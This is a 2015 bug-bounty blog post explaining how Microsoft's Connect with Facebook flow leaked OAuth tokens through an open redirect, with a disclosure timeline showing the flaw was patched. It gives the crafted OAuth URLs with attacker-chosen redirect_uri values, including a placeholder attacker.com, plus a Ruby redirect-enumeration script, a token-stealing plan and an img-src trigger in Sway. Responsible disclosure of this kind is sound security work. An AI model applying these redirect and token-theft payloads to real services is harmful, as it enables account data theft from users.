---
layout: post

title: "Stealing OAuth tokens in Microsoft Web applications"
subtitle: ""
cover_image: microsoft/microsoft.jpg

excerpt: "Wide redirect_uri parameter in the OAuth process allows an attacker to leak the Facebook OAuth token and steal user private information "

author:
  name: Lorenzo Fontana
  twitter: r0rshark
  gplus: 110104859248839601734
  bio: Bug hunter and student at Polimi
  image: me.png
facebook:
  sharelink: /2015/09/15/microsoft

---

### TL;DR
The Connect with Facebook functionality of Microsoft is vulnerable to the OAuth Covert Redirect attack.
The ``redirect_uri`` parameter can be modified by the attacker making the Facebook OAuth token leak to a domain not controlled by Microsoft and in this way steal user private information accessible through the token.

### OAUTH GUIDE ###

A basic undestanding of the OAuth flow is useful to better understand this post, a very good guide can be found [here](https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2). When reading the guide focus the attention on *"Grant Type: Authorization Code"* and the *"Grant Type: Implicit"* which are by far the most common approaches.



### PROBING FOR WIDE REDIRECT_URI ###
The ``redirect_uri`` parameter is very important because it represents the url to which the **authorization_code/access_token** (based on Grant Type) is sent. If we are able to change the value of the ``redirect_uri`` and not to make the OAuth flow to fail (because of authenticity checks on the ``redirect_uri``) we could leak the token/code to a domain controlled by us.
Original Oauth request:

``https://www.facebook.com/v2.0/dialog/oauth?client_id=441348565910475``<br>
``&redirect_uri=``**https://profile.live.com/cid-847183e5db31faa2/services**<br>
``&scope=user_photos``

Possible redirect_url:

- **Completely different domain**:  redirect_uri=``https://attacker.com``;
- **Different subdomain**: redirect_uri=https://``xxx.live.com``/cid-847183e5db31faa2/services;
- **Different folder**: redirect_uri= https://profile.live.com``/xxx``;

The use of a completely different domain is very unlikely to work while in some cases the use of a different folder or subdomain is allowed. Our current payload is:

``https://www.facebook.com/v2.0/dialog/oauth?client_id=441348565910475``<br>
``&redirect_uri=``**https://xxx.live.com/xxx**<br>
``&scope=user_photos``

### SEARCHING FOR OPEN REDIRECT ###
The ability to leak the the token/code to a different subdomain/folder is not useful per se, however it provides to the attacker **a wider attack surface** to find an Open Redirect vulnerability. An Open Redirect endpoint is a url which redirects the user to a parameter value without any validation. The idea is to **find an Open Redirect in \*.live.com/\*** which would leak the token to a domain that we can control.

After some google dorking I have noticed that the endpoint:
  ``g.live.com/0HE_TRACKSTAR_ENUS9/<number>`` issues a 302 Redirect to external domains based on  ``<number>``.<br>
For example ``g.live.com/0HE_TRACKSTAR_ENUS9/1``<br>
redirects to ``http://www.msn.com/it-it/``<br>
Through a 30 line of ruby script I have enumerated the possible domains to which I could leak the token
{% highlight ruby %}

require "net/http"
require "uri"
require 'cgi'

if ARGV.length < 4
  puts "url_brute.rb <url to bruteforce> <start number> <end number> <file where to write>"
  exit
end

base_url = ARGV[0]
start = ARGV[1]
ending = ARGV[2]
file_path = ARGV[3]

uri = URI.parse(base_url)
http = Net::HTTP.new(uri.host, uri.port)
file = File.open(file_path, "a")

start.upto(ending){|id|
  uri = URI.parse(base_url+id.to_s)
  request = Net::HTTP::Get.new(uri.request_uri)
  begin
    response = http.request(request)
    found_url = response["Location"].to_s
  rescue
    found_url = id.to_s+ " Timeout"
    next
  end
  file.write(id.to_s+ " "+found_url+"\n")
  puts id.to_s+ " " + found_url

}
file.close()

{% endhighlight %}

Among these domains there are some which can be purchased like  g.live.com/0HE_TRACKSTAR_CSCZ9/75011  which redirects to  http://staysafe.org/ .
Making the  user issue a GET request to ``https://www.facebook.com/v2.0/dialog/oauth?redirect_uri=http://g.live.com/0HE_TRACKSTAR_CSCZ9/75011&display=popup``<br>
``&scope=user_photos+user_videos&client_id=441348565910475&ret=login`` will leak the token/code to  *http://staysafe.org/*.


###CHANGING THE FLOW###
Referencing to the guide that I have pointed out before the ``Grant Type`` used by Microsoft is the ``Authorization Code`` one. Using the exploit we can leak the ``Authorization Code`` but in order to access the protected information we need to exchange the ``Authorization code`` with the ``Access Token``. However in order achieve this we need to know the ``client_secret`` which we aren't able to get since it is stored on the Microsoft servers. In order to bypass this limitation we can change ``Grant Type`` to the ``Implicit`` one which directly provides the ``Access Token`` to the url in the redirect_url field.
With the Facebook SDK this can be done by **adding the parameter response_type=token**.

###STEALING THE TOKEN###
An attaker could:

1. Purchased the domain ``http://staysafe.org/``;
2. Insert a small javascript script at staysafe.org to get the window.location.hash and parse it to ``extract the token``;
3. Make the victim issue a GET request to ``https://www.facebook.com/v2.0/dialog/oauth?redirect_uri=http://g.live.com/0HE_TRACKSTAR_CSCZ9/75011&display=popup``<br>
``&scope=user_photos+user_videos&client_id=441348565910475&ret=login&response_type=token``.

###TRIGGER THE EXPLOIT WITHOUT INTERACTION###
The Connect with Facebook functionality can be used in the ``Microsoft Sway application`` where I found a second vulnerability which would allow an attaker to make the user issue arbitrary GET requests by just viewing a ``"sway"``.
This is possible because, crafting a particular request in the Add image functionality, an attacker is able to persistently control the ``src attribute of an img tag``. I tried to exploit this kind of vulnerability to get an XSS however the quotes were escaped and the ``javascript:alert(1)`` payload in the img src attribute doesn't work in the modern browsers. However we can use this vulnerability to automatically make the user issue our "exploit GET request" triggering our exploit as soon as he view a maliciously crafted ``"sway"``.

<div class="full zoomable">
  <img src="/images/microsoft/sway_poc.png">
</div>

- 15 May 2015 Vulnerability reported to the Microsoft Security Team
- 4 August 2015 Vulnerability patched
- 25 August 2015 Got reward of 1000$





